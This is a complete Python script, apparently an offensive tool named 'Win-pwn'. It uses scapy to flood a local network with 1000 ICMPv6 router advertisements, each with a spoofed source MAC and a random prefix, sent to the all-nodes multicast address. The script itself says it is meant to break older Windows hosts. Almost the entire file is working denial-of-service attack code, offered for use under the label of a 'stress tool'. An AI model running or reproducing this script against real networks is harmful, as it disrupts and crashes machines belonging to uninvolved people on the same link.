#!/usr/bin/python2.7
# 
# Author: LukeBob
#
# ipv6 Stress Tool
# Usage: ./Win-pwn.py
# Works on some older unix systems, works best with "windows 7" or older
# Sends 1000 random ipv6 addresses to all nodes. "ALL NODES!"
# Carefull, use at your own risk!

import sys, random
import string
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IPv6,ICMPv6ND_RA,ICMPv6NDOptSrcLLAddr,ICMPv6NDOptMTU,ICMPv6NDOptPrefixInfo,send


def banner():
    print (r'''
                  _
                 (_)
        __      ___ _ __      _ ____      ___ __
        \ \ /\ / | | '_ \    | '_ \ \ /\ / | '_ \
         \ V  V /| | | | |   | |_) \ V  V /| | | |
          \_/\_/ |_|_| |_|   | .__/ \_/\_/ |_| |_|
                             | |
                             |_|
          \n''')
    return

# Creates random mac #
def randomMAC():
    mac = [ 0x00, 0x16, 0x3e,
    random.randint(0x00, 0x7f),
    random.randint(0x00, 0xff),
    random.randint(0x00, 0xff) ]
    return (':'.join(map(lambda x: "%02x" % x, mac)))

# creates random prefix #
def prefixi():
    prefix = [random.randint(0x00, 0xff),random.randint(0x00, 0xff)]
    return (''.join(map(lambda x: "%02x" % x, prefix)))

# creates and sends the packet #
def Multicast(newmac, prefix):
    a = IPv6()                  # create ipv6 object
    a.dst = "ff02::1"           # dest addr = ipv6 multicast to all nodes
    b = ICMPv6ND_RA()
    c = ICMPv6NDOptSrcLLAddr()
    c.lladdr = newmac           # c.lladdr spoofed source mac address
    d = ICMPv6NDOptMTU()
    e = ICMPv6NDOptPrefixInfo()
    e.prefixlen = 64
    e.prefix = str(prefix+'::') # sets new prefix
    send(a/b/c/d/e, verbose=0)  # Sends multicast packet

# main loop #
def main():
    try:
        banner()
        print '\n\n     Breaking all windows now...\n'
        while True:
            for i in range(0,1000):
                prefix = prefixi()
                newmac = randomMAC()
                Multicast(newmac,prefix)
            print '\n   1000 New Addresses Leased! ;P\n'
            sys.exit(0)
    except KeyboardInterrupt:
        print '\nExiting!...\n'
        sys.exit(0)

if __name__ == '__main__':
    main()
